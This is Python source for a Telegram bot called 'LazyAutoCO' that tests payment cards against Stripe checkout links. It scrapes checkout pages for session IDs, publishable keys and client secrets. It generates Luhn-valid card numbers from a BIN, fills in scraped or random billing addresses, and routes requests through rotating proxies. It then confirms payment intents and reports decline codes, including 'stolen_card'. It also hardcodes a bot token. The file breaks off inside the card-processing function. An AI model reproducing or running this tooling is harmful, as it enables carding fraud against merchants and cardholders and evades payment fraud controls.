import asyncio
import aiohttp
import logging
import re
import json
import time
import random
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Tuple, Any
from dataclasses import dataclass, asdict
from urllib.parse import urlparse, parse_qs
import base64
import socket
import ssl

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler,
    ConversationHandler,
)
import nest_asyncio
nest_asyncio.apply()

# ============= CONFIGURATION =============
BOT_TOKEN = "8249305108:AAF8gvL3E-y-ybKJNL3r60HV1lEyg-e0Z9Q"
ADMIN_IDS = [8447673079]  # Your Telegram user ID

# ============= LOGGING =============
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============= CONVERSATION STATES =============
(WAITING_EMAIL, WAITING_PROXY_LIST, WAITING_URL, WAITING_CARDS, WAITING_BIN) = range(5)

# ============= DATA CLASSES =============
@dataclass
class Card:
    number: str
    month: str
    year: str
    cvv: str
    
    @classmethod
    def from_string(cls, card_str: str) -> Optional['Card']:
        """Parse card from string format"""
        card_str = card_str.strip()
        
        # Handle different separators
        if '|' in card_str:
            parts = card_str.split('|')
        else:
            parts = card_str.split()
        
        if len(parts) >= 4:
            number = re.sub(r'\D', '', parts[0])
            month = re.sub(r'\D', '', parts[1]).zfill(2)
            year = re.sub(r'\D', '', parts[2]).zfill(2)
            cvv = re.sub(r'\D', '', parts[3])
            
            if len(number) >= 13 and len(number) <= 19:
                if 1 <= int(month) <= 12:
                    if len(year) in [2, 4]:
                        if len(cvv) in [3, 4]:
                            return cls(
                                number=number,
                                month=month,
                                year=year[-2:] if len(year) == 4 else year,
                                cvv=cvv
                            )
        return None
    
    @classmethod
    def generate_from_bin(cls, bin_str: str, count: int = 1) -> List['Card']:
        """Generate valid Luhn cards from BIN"""
        bin_clean = re.sub(r'\D', '', bin_str)[:6]
        if len(bin_clean) < 6:
            return []
        
        cards = []
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        def luhn_checksum(card_number: str) -> int:
            """Calculate Luhn check digit"""
            def digits_of(n):
                return [int(d) for d in str(n)]
            digits = digits_of(card_number)
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = sum(odd_digits)
            for d in even_digits:
                checksum += sum(digits_of(d * 2))
            return checksum % 10
        
        def is_amex(bin_prefix: str) -> bool:
            """Check if BIN is Amex"""
            return bin_prefix[:2] in ['34', '37']
        
        for _ in range(min(count, 10)):
            # Generate random 9 digits
            remaining = ''.join(str(random.randint(0, 9)) for _ in range(9))
            number_without_check = bin_clean + remaining
            
            # Calculate check digit
            check = luhn_checksum(number_without_check)
            number = number_without_check + str((10 - check) % 10)
            
            # Generate expiry (1-4 years ahead)
            year_offset = random.randint(1, 4)
            year = (current_year + year_offset) % 100
            month = random.randint(1, 12)
            
            # Ensure month is not in past for current year
            if year_offset == 0 and month < current_month:
                month = random.randint(current_month, 12)
            
            # Generate CVV based on card type
            cvv_length = 4 if is_amex(bin_clean) else 3
            cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_length))
            
            cards.append(cls(
                number=number,
                month=str(month).zfill(2),
                year=str(year).zfill(2),
                cvv=cvv
            ))
        
        return cards
    
    @property
    def full(self) -> str:
        return f"{self.number}|{self.month}|{self.year}|{self.cvv}"
    
    @property
    def masked(self) -> str:
        return f"{self.number[:6]}xxxxxx{self.number[-4:]}"

@dataclass
class Address:
    name: str
    line1: str
    line2: str = ""
    city: str = ""
    state: str = ""
    postal_code: str = ""
    country: str = "US"
    phone: str = ""
    
    @classmethod
    async def fetch_from_bestrandoms(cls, country: str = "us") -> Optional['Address']:
        """Fetch real random address from bestrandoms.com"""
        try:
            async with aiohttp.ClientSession() as session:
                url = f"https://www.bestrandoms.com/random-address-in-{country}?quantity=1"
                async with session.get(url, timeout=10) as resp:
                    if resp.status == 200:
                        html = await resp.text()
                        
                        # Parse the HTML response
                        name_match = re.search(r'<strong>Name:</strong>\s*([^<]+)', html)
                        street_match = re.search(r'<strong>Street:</strong>\s*([^<]+)', html)
                        city_match = re.search(r'<strong>City:</strong>\s*([^<]+)', html)
                        state_match = re.search(r'<strong>State:</strong>\s*([^<]+)', html)
                        zip_match = re.search(r'<strong>ZIP:</strong>\s*([^<]+)', html)
                        phone_match = re.search(r'<strong>Phone:</strong>\s*([^<]+)', html)
                        
                        if street_match and city_match and state_match and zip_match:
                            name = name_match.group(1).strip() if name_match else f"User {random.randint(100,999)}"
                            street = street_match.group(1).strip()
                            city = city_match.group(1).strip()
                            state = state_match.group(1).strip()
                            zip_code = zip_match.group(1).strip()
                            phone = phone_match.group(1).strip() if phone_match else f"+1{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
                            
                            return cls(
                                name=name,
                                line1=street,
                                city=city,
                                state=state,
                                postal_code=zip_code,
                                country=country.upper(),
                                phone=phone
                            )
        except Exception as e:
            logger.error(f"Error fetching address: {e}")
        
        # Fallback to random generation
        return cls.generate_random()
    
    @classmethod
    def generate_random(cls) -> 'Address':
        """Generate random US address (fallback)"""
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        
        streets = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine Rd", "Washington Ave", "Park St", "Lake Dr", "Hill St", "River Rd"]
        cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
        states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
        zips = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
        
        idx = random.randint(0, 9)
        
        return cls(
            name=f"{random.choice(first_names)} {random.choice(last_names)}",
            line1=f"{random.randint(100, 9999)} {random.choice(streets)}",
            city=cities[idx],
            state=states[idx],
            postal_code=zips[idx],
            country="US",
            phone=f"+1{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
        )
    
    def to_dict(self) -> Dict:
        return {
            "name": self.name,
            "address_line1": self.line1,
            "address_line2": self.line2,
            "address_city": self.city,
            "address_state": self.state,
            "address_zip": self.postal_code,
            "address_country": self.country,
            "phone": self.phone
        }

@dataclass
class Proxy:
    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None
    type: str = "http"
    working: bool = False
    response_time: int = 0
    country: str = ""
    
    @classmethod
    def from_string(cls, proxy_str: str) -> Optional['Proxy']:
        """Parse proxy from various formats"""
        proxy_str = proxy_str.strip()
        
        # Format: host:port:user:pass
        if proxy_str.count(':') >= 3:
            parts = proxy_str.split(':')
            if len(parts) >= 4:
                # Check if first part is host (contains dots)
                if '.' in parts[0] or parts[0].replace('.', '').isdigit():
                    return cls(
                        host=parts[0],
                        port=int(parts[1]),
                        username=parts[2],
                        password=':'.join(parts[3:])
                    )
                else:
                    # Format: user:pass:host:port
                    return cls(
                        host=parts[-2],
                        port=int(parts[-1]),
                        username=parts[0],
                        password=':'.join(parts[1:-2])
                    )
        
        # Format: user:pass@host:port
        elif '@' in proxy_str:
            auth_part, host_part = proxy_str.rsplit('@', 1)
            if ':' in auth_part and ':' in host_part:
                username, password = auth_part.split(':', 1)
                host, port = host_part.split(':', 1)
                return cls(
                    host=host,
                    port=int(port),
                    username=username,
                    password=password
                )
        
        # Format: host:port
        elif proxy_str.count(':') == 1:
            host, port = proxy_str.split(':')
            return cls(host=host, port=int(port))
        
        return None
    
    @property
    def url(self) -> str:
        if self.username and self.password:
            return f"{self.type}://{self.username}:{self.password}@{self.host}:{self.port}"
        return f"{self.type}://{self.host}:{self.port}"
    
    @property
    def auth(self) -> Optional[aiohttp.BasicAuth]:
        if self.username and self.password:
            return aiohttp.BasicAuth(self.username, self.password)
        return None
    
    @property
    def display(self) -> str:
        if self.username and self.password:
            return f"{self.host}:{self.port}:{self.username}:{self.password[:2]}***"
        return f"{self.host}:{self.port}"

@dataclass
class CheckoutInfo:
    url: str
    session_id: Optional[str] = None
    publishable_key: Optional[str] = None
    client_secret: Optional[str] = None
    payment_intent_id: Optional[str] = None
    amount: Optional[int] = None
    currency: str = "usd"
    merchant: str = ""
    product: str = ""
    email: Optional[str] = None
    country: str = "US"
    requires_address: bool = False
    requires_phone: bool = False
    requires_name: bool = False
    
    @property
    def amount_formatted(self) -> str:
        if self.amount:
            symbols = {
                "usd": "$", "eur": "€", "gbp": "£", "jpy": "¥",
                "cad": "C$", "aud": "A$", "inr": "₹", "krw": "₩"
            }
            symbol = symbols.get(self.currency.lower(), self.currency.upper())
            return f"{symbol}{(self.amount / 100):.2f}"
        return "Unknown"
    
    @property
    def domain(self) -> str:
        try:
            parsed = urlparse(self.url)
            return parsed.netloc.replace('www.', '')
        except:
            return "unknown.com"

@dataclass
class HitResult:
    card: Card
    status: str  # 'success', 'decline', 'error'
    message: str
    response_code: Optional[str] = None
    payment_intent_id: Optional[str] = None

# ============= PROXY MANAGER =============
class ProxyManager:
    def __init__(self):
        self.user_proxies: Dict[int, List[Proxy]] = {}  # user_id -> list of proxies
        self.current_index: Dict[int, int] = {}  # user_id -> current proxy index
        self.user_sessions: Dict[int, aiohttp.ClientSession] = {}
        self.last_check: Dict[str, float] = {}  # proxy -> last check time
    
    async def add_proxies(self, user_id: int, proxy_strings: List[str]) -> Tuple[int, int]:
        """Add and test multiple proxies"""
        proxies = []
        working = 0
        
        for proxy_str in proxy_strings:
            proxy = Proxy.from_string(proxy_str)
            if proxy:
                proxies.append(proxy)
        
        if not proxies:
            return 0, 0
        
        self.user_proxies[user_id] = proxies
        self.current_index[user_id] = 0
        
        # Test all proxies in background
        asyncio.create_task(self.test_all_proxies(user_id))
        
        return len(proxies), 0  # Will update when tests complete
    
    async def test_all_proxies(self, user_id: int):
        """Test all proxies for a user"""
        if user_id not in self.user_proxies:
            return
        
        working_count = 0
        for proxy in self.user_proxies[user_id]:
            is_working, info = await self.test_proxy(proxy)
            if is_working:
                proxy.working = True
                proxy.country = info.get('country', '')
                proxy.response_time = info.get('response_time', 0)
                working_count += 1
            else:
                proxy.working = False
        
        return working_count
    
    async def test_proxy(self, proxy: Proxy) -> Tuple[bool, Dict]:
        """Test if proxy is working"""
        cache_key = f"{proxy.host}:{proxy.port}"
        now = time.time()
        
        # Cache test results for 5 minutes
        if cache_key in self.last_check and now - self.last_check[cache_key] < 300:
            return True, {"cached": True}
        
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            start = time.time()
            
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(
                    "http://ip-api.com/json/",
                    proxy=proxy.url,
                    proxy_auth=proxy.auth,
                    timeout=10
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        response_time = int((time.time() - start) * 1000)
                        self.last_check[cache_key] = now
                        return True, {
                            "ip": data.get("query"),
                            "country": data.get("country"),
                            "city": data.get("city"),
                            "response_time": response_time
                        }
                    return False, {"error": f"HTTP {resp.status}"}
        except asyncio.TimeoutError:
            return False, {"error": "Timeout"}
        except Exception as e:
            return False, {"error": str(e)}
    
    def get_next_proxy(self, user_id: int) -> Optional[Proxy]:
        """Get next working proxy (round-robin)"""
        if user_id not in self.user_proxies:
            return None
        
        proxies = self.user_proxies[user_id]
        if not proxies:
            return None
        
        # Try to find a working proxy
        working_proxies = [p for p in proxies if p.working]
        if not working_proxies:
            # If none marked working, try the next one
            idx = self.current_index.get(user_id, 0)
            proxy = proxies[idx % len(proxies)]
            self.current_index[user_id] = (idx + 1) % len(proxies)
            return proxy
        
        # Round-robin through working proxies
        idx = self.current_index.get(user_id, 0) % len(working_proxies)
        proxy = working_proxies[idx]
        self.current_index[user_id] = (idx + 1) % len(working_proxies)
        return proxy
    
    async def get_session(self, user_id: int) -> aiohttp.ClientSession:
        """Get or create aiohttp session with current proxy"""
        proxy = self.get_next_proxy(user_id)
        
        connector = aiohttp.TCPConnector(ssl=False, force_close=True)
        
        if proxy and proxy.working:
            return aiohttp.ClientSession(
                connector=connector,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "application/json",
                    "Accept-Language": "en-US,en;q=0.9",
                },
                proxy=proxy.url,
                proxy_auth=proxy.auth
            )
        else:
            return aiohttp.ClientSession(
                connector=connector,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "application/json",
                }
            )
    
    def clear_user(self, user_id: int):
        """Clear all data for a user"""
        if user_id in self.user_proxies:
            del self.user_proxies[user_id]
        if user_id in self.current_index:
            del self.current_index[user_id]

# ============= STRIPE API HANDLER =============
class StripeAPI:
    def __init__(self, proxy_manager: ProxyManager):
        self.proxy_manager = proxy_manager
        self.stripe_api_url = "https://api.stripe.com"
    
    async def extract_checkout_info(self, url: str, user_id: int) -> Optional[CheckoutInfo]:
        """Extract checkout information from Stripe URL"""
        session = await self.proxy_manager.get_session(user_id)
        
        try:
            async with session.get(url, allow_redirects=True, timeout=15, ssl=False) as resp:
                if resp.status != 200:
                    logger.error(f"Failed to fetch URL: {resp.status}")
                    return None
                
                html = await resp.text()
                final_url = str(resp.url)
                
                info = CheckoutInfo(url=final_url)
                
                # Extract session ID
                session_patterns = [
                    r'["\']?(cs_(?:test|live)_[a-zA-Z0-9]{,64})["\']?',
                    r'/c/pay/(cs_live_[a-zA-Z0-9]+)',
                    r'/c/pay/(cs_test_[a-zA-Z0-9]+)',
                    r'checkout\.stripe\.com/(?:c/)?pay/(cs_live_[a-zA-Z0-9]+)',
                    r'checkout\.stripe\.com/(?:c/)?pay/(cs_test_[a-zA-Z0-9]+)',
                ]
                
                for pattern in session_patterns:
                    match = re.search(pattern, final_url) or re.search(pattern, url) or re.search(pattern, html)
                    if match:
                        info.session_id = match.group(1)
                        break
                
                # Extract publishable key
                key_patterns = [
                    r'pk_live_[a-zA-Z0-9]+',
                    r'pk_test_[a-zA-Z0-9]+',
                    r'"publishableKey"\s*:\s*"(pk_live_[a-zA-Z0-9]+)"',
                    r'"publishableKey"\s*:\s*"(pk_test_[a-zA-Z0-9]+)"',
                    r'data-stripe-publishable-key="(pk_live_[a-zA-Z0-9]+)"',
                ]
                
                for pattern in key_patterns:
                    match = re.search(pattern, html)
                    if match:
                        info.publishable_key = match.group(1) if '(' in pattern and match.groups() else match.group(0)
                        break
                
                # Extract client secret
                secret_match = re.search(r'"client_secret":\s*"([^"]+)"', html)
                if secret_match:
                    info.client_secret = secret_match.group(1)
                    if '_secret_' in info.client_secret:
                        info.payment_intent_id = info.client_secret.split('_secret_')[0]
                
                # Extract amount
                amount_patterns = [
                    r'"amount":\s*(\d+)',
                    r'"amount_total":\s*(\d+)',
                    r'"amount_due":\s*(\d+)',
                    r'data-amount="(\d+)"',
                ]
                
                for pattern in amount_patterns:
                    match = re.search(pattern, html)
                    if match:
                        try:
                            info.amount = int(match.group(1))
                            break
                        except:
                            pass
                
                # Extract currency
                currency_match = re.search(r'"currency":\s*"([a-z]{3})"', html)
                if currency_match:
                    info.currency = currency_match.group(1)
                
                # Extract merchant name
                merchant_patterns = [
                    r'"business_name":\s*"([^"]+)"',
                    r'"display_name":\s*"([^"]+)"',
                    r'"merchant_name":\s*"([^"]+)"',
                    r'<title>([^<]+)(?:\s*[|–-]\s*.*)?</title>',
                ]
                
                for pattern in merchant_patterns:
                    match = re.search(pattern, html)
                    if match:
                        info.merchant = match.group(1).strip()
                        break
                
                # Extract product name
                product_patterns = [
                    r'"description":\s*"([^"]+)"',
                    r'"name":\s*"([^"]+)"',
                    r'"product_name":\s*"([^"]+)"',
                ]
                
                for pattern in product_patterns:
                    match = re.search(pattern, html)
                    if match:
                        info.product = match.group(1).strip()
                        break
                
                # Check what billing info is required
                info.requires_address = 'address' in html.lower() and 'billing' in html.lower()
                info.requires_name = 'cardholder' in html.lower() or 'name on card' in html.lower()
                info.requires_phone = 'phone' in html.lower() and 'billing' in html.lower()
                
                return info
                
        except Exception as e:
            logger.error(f"Error extracting checkout: {e}")
            return None
    
    async def create_payment_method(self, card: Card, address: Address, publishable_key: str, user_id: int) -> Optional[str]:
        """Create a Stripe payment method"""
        session = await self.proxy_manager.get_session(user_id)
        
        url = f"{self.stripe_api_url}/v1/payment_methods"
        data = {
            "type": "card",
            "card[number]": card.number,
            "card[exp_month]": card.month,
            "card[exp_year]": card.year,
            "card[cvc]": card.cvv,
            "billing_details[name]": address.name,
            "billing_details[email]": f"user{random.randint(1000,9999)}@gmail.com",
            "billing_details[address][line1]": address.line1,
            "billing_details[address][city]": address.city,
            "billing_details[address][state]": address.state,
            "billing_details[address][postal_code]": address.postal_code,
            "billing_details[address][country]": address.country,
        }
        
        if address.phone:
            data["billing_details[phone]"] = address.phone
        
        headers = {
            "Authorization": f"Bearer {publishable_key}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        try:
            async with session.post(url, data=data, headers=headers, timeout=15, ssl=False) as resp:
                result = await resp.json()
                if resp.status in [200, 201] and 'id' in result:
                    return result['id']
                else:
                    logger.error(f"PM creation failed: {result}")
                    return None
        except Exception as e:
            logger.error(f"PM creation error: {e}")
            return None
    
    async def confirm_payment_intent(self, 
                                     payment_intent_id: str, 
                                     payment_method_id: str,
                                     publishable_key: str,
                                     user_id: int) -> Tuple[bool, str, Optional[str]]:
        """Confirm a payment intent"""
        session = await self.proxy_manager.get_session(user_id)
        
        url = f"{self.stripe_api_url}/v1/payment_intents/{payment_intent_id}/confirm"
        data = {
            "payment_method": payment_method_id,
        }
        
        headers = {
            "Authorization": f"Bearer {publishable_key}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        try:
            async with session.post(url, data=data, headers=headers, timeout=20, ssl=False) as resp:
                result = await resp.json()
                
                if resp.status in [200, 201]:
                    if result.get('status') == 'succeeded':
                        return True, "success", result.get('id')
                    elif result.get('status') == 'requires_action':
                        return False, "requires_3ds", None
                    elif result.get('status') == 'requires_payment_method':
                        return False, "requires_new_card", None
                    else:
                        return False, f"status: {result.get('status')}", None
                
                # Check for decline codes
                error = result.get('error', {})
                decline_code = error.get('decline_code', '')
                message = error.get('message', 'unknown_error')
                
                if decline_code:
                    return False, decline_code, None
                else:
                    return False, message, None
                    
        except Exception as e:
            logger.error(f"Confirm error: {e}")
            return False, "request_error", None

# ============= BOT CLASS =============
class CheckoutBot:
    def __init__(self, token: str):
        self.token = token
        self.app = Application.builder().token(token).build()
        
        self.proxy_manager = ProxyManager()
        self.stripe_api = StripeAPI(self.proxy_manager)
        
        self.user_data: Dict[int, Dict] = {}  # user_id -> {email, address, etc}
        self.user_sessions: Dict[int, str] = {}  # user_id -> active session ID
        
        # Register handlers
        self.setup_handlers()
    
    def setup_handlers(self):
        """Setup all command handlers"""
        # Basic commands
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("help", self.help_command))
        self.app.add_handler(CommandHandler("setup", self.setup_command))
        self.app.add_handler(CommandHandler("proxy", self.proxy_command))
        self.app.add_handler(CommandHandler("proxylist", self.proxylist_command))
        self.app.add_handler(CommandHandler("testproxies", self.testproxies_command))
        self.app.add_handler(CommandHandler("clearproxy", self.clearproxy_command))
        self.app.add_handler(CommandHandler("co", self.checkout_command))
        self.app.add_handler(CommandHandler("cb", self.checkout_bin_command))
        self.app.add_handler(CommandHandler("status", self.status_command))
        self.app.add_handler(CommandHandler("cancel", self.cancel_command))
        
        # Message handlers
        self.app.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, 
            self.handle_text
        ))
        
        # Callback handler
        self.app.add_handler(CallbackQueryHandler(self.button_callback))
        
        # Error handler
        self.app.add_error_handler(self.error_handler)
    
    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle errors"""
        logger.error(f"Update {update} caused error {context.error}")
        try:
            await update.message.reply_text("❌ An error occurred. Please try again.")
        except:
            pass
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user_id = update.effective_user.id
        
        # Revoke any previous session
        if user_id in self.user_sessions:
            old_session = self.user_sessions[user_id]
            await self.revoke_session(user_id, old_session)
        
        # Create new session
        session_id = f"session_{user_id}_{int(time.time())}"
        self.user_sessions[user_id] = session_id
        
        welcome = f"""
╔════════════════════════════╗
║     🤖 *LazyAutoCO*        ║
╚════════════════════════════╝

*Session ID:* `{session_id[:10]}...`

*Setup First:*
• `/setup` - Configure your email
• `/proxy` - Add single proxy
• `/proxylist` - Add multiple proxies (one per line)
• `/testproxies` - Test all your proxies

*Commands:*
• `/co <url>` - Test cards against checkout
• `/cb <url> <bin> [count]` - Generate cards from BIN
• `/status` - View your current setup
• `/help` - Detailed help
• `/cancel` - Cancel current operation

*Proxy Formats:*
• `host:port`
• `host:port:user:pass`
• `user:pass@host:port`
• `user:pass:host:port`

*Previous session automatically revoked*
"""
        await update.message.reply_text(welcome, parse_mode='Markdown')
    
    async def revoke_session(self, user_id: int, session_id: str):
        """Revoke previous session"""
        try:
            # Clear all user data
            self.proxy_manager.clear_user(user_id)
            if user_id in self.user_data:
                del self.user_data[user_id]
        except:
            pass
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command"""
        help_text = """
*Detailed Help*

*Card Format:*
• `4111111111111111|12|25|123` (pipe separated)
• `4111111111111111 12 25 123` (space separated)

*BIN Generation:*
• `/cb https://url.com 424242 5`
• Generates 5 valid Luhn cards with BIN 424242

*Address Generation:*
• Fetches REAL random addresses from bestrandoms.com
• Only fetches if checkout requires address
• Includes name, street, city, state, zip, phone

*Proxy Management:*
• `/proxy host:port:user:pass` - Add single proxy
• `/proxylist` - Add multiple proxies (paste list)
• `/testproxies` - Test all your proxies
• `/clearproxy` - Remove all proxies

*Stripe Decline Codes:*
• `insufficient_funds` - Card has insufficient funds
• `card_declined` - Generic decline
• `incorrect_cvc` - Wrong security code
• `expired_card` - Card expired
• `processing_error` - Temporary error
• `do_not_honor` - Bank declined
• `fraudulent` - Flagged as fraud
• `lost_card` - Card reported lost
• `stolen_card` - Card reported stolen

*Auto Session Revoke:*
• Previous session automatically revoked on /start
• Prevents multiple simultaneous sessions
"""
        await update.message.reply_text(help_text, parse_mode='Markdown')
    
    async def setup_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /setup command"""
        user_id = update.effective_user.id
        
        context.user_data['state'] = WAITING_EMAIL
        
        await update.message.reply_text(
            "📧 *Setup*\n\n"
            "Please enter your default email address:\n"
            "`example@email.com`",
            parse_mode='Markdown'
        )
    
    async def proxy_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /proxy command for single proxy"""
        if context.args:
            proxy_str = ' '.join(context.args)
            success, message = await self.add_single_proxy(update.effective_user.id, proxy_str)
            
            if success:
                await update.message.reply_text(f"✅ {message}")
            else:
                await update.message.reply_text(f"❌ {message}")
        else:
            context.user_data['state'] = WAITING_PROXY_LIST
            await update.message.reply_text(
                "🌐 *Add Proxy*\n\n"
                "Send your proxy in one of these formats:\n"
                "• `host:port`\n"
                "• `host:port:user:pass`\n"
                "• `user:pass@host:port`\n"
                "• `user:pass:host:port`\n\n"
                "Example: `192.168.1.1:8080:admin:password`",
                parse_mode='Markdown'
            )
    
    async def proxylist_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /proxylist command for multiple proxies"""
        context.user_data['state'] = WAITING_PROXY_LIST
        await update.message.reply_text(
            "🌐 *Add Multiple Proxies*\n\n"
            "Send your proxies (one per line):\n"
            "`host:port:user:pass`\n"
            "`host:port:user:pass`\n"
            "`host:port:user:pass`\n\n"
            "Max 50 proxies",
            parse_mode='Markdown'
        )
    
    async def add_single_proxy(self, user_id: int, proxy_str: str) -> Tuple[bool, str]:
        """Add and test a single proxy"""
        proxy = Proxy.from_string(proxy_str)
        if not proxy:
            return False, "Invalid proxy format"
        
        # Test the proxy
        is_working, info = await self.proxy_manager.test_proxy(proxy)
        
        if is_working:
            proxy.working = True
            proxy.country = info.get('country', '')
            proxy.response_time = info.get('response_time', 0)
            
            if user_id not in self.proxy_manager.user_proxies:
                self.proxy_manager.user_proxies[user_id] = []
            
            self.proxy_manager.user_proxies[user_id].append(proxy)
            self.proxy_manager.current_index[user_id] = 0
            
            return True, f"Proxy added and working! {info.get('ip')} - {info.get('country')} - {info.get('response_time')}ms"
        else:
            return False, f"Proxy not working: {info.get('error')}"
    
    async def testproxies_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Test all proxies for user"""
        user_id = update.effective_user.id
        
        if user_id not in self.proxy_manager.user_proxies or not self.proxy_manager.user_proxies[user_id]:
            await update.message.reply_text("❌ No proxies set. Use /proxy or /proxylist first")
            return
        
        status_msg = await update.message.reply_text("🔄 Testing all proxies...")
        
        working = await self.proxy_manager.test_all_proxies(user_id)
        total = len(self.proxy_manager.user_proxies[user_id])
        
        result = f"""
✅ *Proxy Test Complete*

*Total:* {total}
*Working:* {working}
*Failed:* {total - working}

Working proxies will be used in rotation
"""
        await status_msg.edit_text(result, parse_mode='Markdown')
    
    async def clearproxy_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Clear all proxies for user"""
        user_id = update.effective_user.id
        self.proxy_manager.clear_user(user_id)
        await update.message.reply_text("🗑️ All proxies cleared")
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /status command"""
        user_id = update.effective_user.id
        user_data = self.user_data.get(user_id, {})
        proxies = self.proxy_manager.user_proxies.get(user_id, [])
        
        working_proxies = [p for p in proxies if p.working]
        
        status = f"""
*Your Configuration*

*Email:* `{user_data.get('email', 'Not set')}`
*Proxies:* {len(working_proxies)}/{len(proxies)} working

*Session:* `{self.user_sessions.get(user_id, 'None')[:10]}...`

Use /setup to configure email
Use /proxy or /proxylist to add proxies
"""
        await update.message.reply_text(status, parse_mode='Markdown')
    
    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /cancel command"""
        context.user_data.clear()
        await update.message.reply_text("❌ Operation cancelled")
    
    async def checkout_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /co command"""
        user_id = update.effective_user.id
        
        # Check if email is set
        if user_id not in self.user_data or 'email' not in self.user_data[user_id]:
            await update.message.reply_text(
                "❌ Please set up your email first with /setup"
            )
            return
        
        if not context.args:
            await update.message.reply_text(
                "Usage: `/co <stripe_checkout_url>`\n"
                "Example: `/co https://buy.stripe.com/test_123`",
                parse_mode='Markdown'
            )
            return
        
        url = context.args[0]
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        context.user_data['url'] = url
        context.user_data['state'] = WAITING_CARDS
        
        # Fetch checkout info
        info_msg = await update.message.reply_text("🔄 Fetching checkout info...")
        checkout_info = await self.stripe_api.extract_checkout_info(url, user_id)
        
        if checkout_info:
            # Fetch address if needed
            address = None
            if checkout_info.requires_address:
                address = await Address.fetch_from_bestrandoms(checkout_info.country.lower())
                context.user_data['address'] = address
            
            info_text = f"""
✅ *Checkout Detected*

*Merchant:* {checkout_info.merchant or checkout_info.domain}
*Product:* {checkout_info.product or 'N/A'}
*Amount:* {checkout_info.amount_formatted}
*Session:* `{checkout_info.session_id or 'N/A'}`
*Requires:* {'Address, ' if checkout_info.requires_address else ''}{'Name, ' if checkout_info.requires_name else ''}{'Phone' if checkout_info.requires_phone else ''}

{f'*Address:* {address.line1}, {address.city}, {address.state} {address.postal_code}' if address else ''}

Now send your cards (one per line, max 10):
`4111111111111111|12|25|123`
"""
            await info_msg.edit_text(info_text, parse_mode='Markdown')
            context.user_data['checkout_info'] = checkout_info
        else:
            await info_msg.edit_text(
                f"⚠️ Couldn't fetch details\n"
                f"URL: `{url}`\n\n"
                f"Send cards anyway? (one per line)",
                parse_mode='Markdown'
            )
    
    async def checkout_bin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /cb command (BIN generation)"""
        user_id = update.effective_user.id
        
        if user_id not in self.user_data or 'email' not in self.user_data[user_id]:
            await update.message.reply_text("❌ Please set up your email first with /setup")
            return
        
        if len(context.args) < 2:
            await update.message.reply_text(
                "Usage: `/cb <url> <bin> [count]`\n"
                "Example: `/cb https://buy.stripe.com/... 424242 5`",
                parse_mode='Markdown'
            )
            return
        
        url = context.args[0]
        bin_str = context.args[1]
        count = 1
        
        if len(context.args) >= 3:
            try:
                count = min(int(context.args[2]), 10)
            except:
                count = 1
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        bin_clean = re.sub(r'\D', '', bin_str)
        if len(bin_clean) < 6:
            await update.message.reply_text("❌ BIN must be at least 6 digits")
            return
        
        status_msg = await update.message.reply_text("🔄 Fetching checkout info and generating cards...")
        
        # Fetch checkout info
        checkout_info = await self.stripe_api.extract_checkout_info(url, user_id)
        
        if not checkout_info:
            checkout_info = CheckoutInfo(url=url)
        
        # Fetch address if needed
        address = None
        if checkout_info.requires_address:
            address = await Address.fetch_from_bestrandoms(checkout_info.country.lower())
        
        # Generate cards
        cards = Card.generate_from_bin(bin_clean, count)
        
        # Process cards
        results = await self.process_cards_real(user_id, checkout_info, cards, address, status_msg)
        
        # Send results
        await self.send_formatted_results(update, context, checkout_info, results, count)
    
    async def process_cards_real(self, user_id: int, checkout_info: CheckoutInfo, cards: List[Card], 
                                 address: Optional[Address], status_msg=None) -> List[HitResult]:
        """Process cards against Stripe"""
        results = []
        
        # Use provided address or generate random one
        if not address:
            address = Address.generate_random()
        
